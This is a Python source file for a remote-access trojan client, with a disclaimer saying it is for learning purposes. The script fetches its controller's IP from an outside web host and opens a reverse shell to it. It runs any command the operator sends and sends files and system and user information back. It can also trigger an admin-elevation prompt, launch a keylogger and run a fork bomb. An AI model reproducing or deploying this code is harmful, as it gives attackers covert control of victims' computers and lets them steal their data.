import socket
import subprocess
import os
import platform
import getpass
from time import sleep
import time
import ctypes, sys
from win10toast import ToastNotifier
import requests


# This script was written for learning purposes. Do not run this on anyones computer without the owners consent.
# I do not take any responsibility for misuse of this script.


def client(prt):
    # get the host IP from server - this is done to prevent connection loss when the host changes it's IP
    r = requests.get(url='http://langunity.net/client_py.html') # { "host" : "HOST_IP" }
    hostdict = r.json() # transfer host ip into a dict


    toaster = ToastNotifier() # initialize ToastNotifier - this is used to send Windows Notifications

    numbers = 0 # this number is for tracking the amount of reconnection attempts
    connected = True # this value is set to track if the client is connected to the host
    # cpmmect to the host
    RHOST = hostdict["host"] # get the host address from the hostdict, which comes from the webservice
    RPORT = int(prt) # get port passed along from the executer
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((RHOST, RPORT))
    print('[-] Connected to remote')

    while True:        
        try:
            # get the input from the server
            header = f"""{getpass.getuser()}@{platform.node()}:{os.getcwd()}$ """
            sock.send(header.encode())
            STDOUT, STDERR = None, None
            cmd = sock.recv(1024).decode("utf-8")

            # List files in the folder
            if cmd == "list":
                sock.send(str(os.listdir(".")).encode())

            # Forkbomb - Copy the proccess over and over, causing the client to crash - not working at the moment
            if cmd == "forkbomb":
                while True:
                    os.fork()

            # Change directory - should be more stable than windows CMD command
            elif cmd.split(" ")[0] == "cd":
                os.chdir(cmd.split(" ")[1])
                sock.send("Changed directory to {}".format(os.getcwd()).encode())

            # Get system info and send it to the server
            elif cmd == "sysinfo":
                sysinfo = f"""
    Operating System: {platform.system()}
    Computer Name: {platform.node()}
    Username: {getpass.getuser()}
    Release Version: {platform.release()}
    Processor Architecture: {platform.processor()}
                """
                sock.send(sysinfo.encode())

            # Download files
            elif cmd.split(" ")[0] == "download":
                with open(cmd.split(" ")[1], "rb") as f:
                    file_data = f.read(3096)
                    while file_data:
                        print("Sending", file_data)
                        sock.send(file_data)
                        file_data = f.read(3096)
                    sleep(2)
                    sock.send(b"DONE")
                print("Finished sending data")

            # Ask for admin permissions
            elif cmd == "getadmin":
                def is_admin():
                    try:
                        return ctypes.windll.shell32.IsUserAnAdmin()
                    except:
                        return False

                if is_admin():
                    returnvalue = "Admin granted"
                else:
                    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
                    returnvalue = "Admin not granted"
                sock.send(returnvalue.encode())
            
            # start the keylogger - not working right now 
            elif cmd == "startkeylogger":
                subprocess.Popen('pythonw.exe C:\pycm\keylogger.py')

            # Close the connection
            elif cmd == "exit":
                toaster.show_toast("Debug", "connection ended", threaded=True, # show "disconnected" debug notice to client
                    icon_path=None, duration=3) 
                sock.send(b"exit")
                break
            
            
            # Run any other command
            else:
                comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                STDOUT, STDERR = comm.communicate()
                if not STDOUT:
                    sock.send(STDERR)
                else:
                    sock.send(STDOUT)

            # If the connection terminates
            if not cmd:
                print("Connection dropped")
                break
        except socket.error: # reconnect on socket errors - wait for host to come back online
            connected = False
            print("[-] Connection lost")
            while not connected:
                try:                
                    print("+++++ Reconnection attempt " + str(numbers))
                    numbers = numbers + 1  
                    print("[-] Attempting reconnect")
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
                    sock.connect((RHOST, RPORT))
                    connected = True  
                    print( "re-connection successful" )  
                except socket.error:
                    print("[-] reconnect unsuccessful")    
                    sleep( 2 )
        except: # on any other error
            print('Oops... Something went wrong.')            
            
    sock.close()
    
# get cmd command arguments or arguments passed along from the executer.py
if __name__ == '__main__':
    globals()[sys.argv[1]](sys.argv[2])

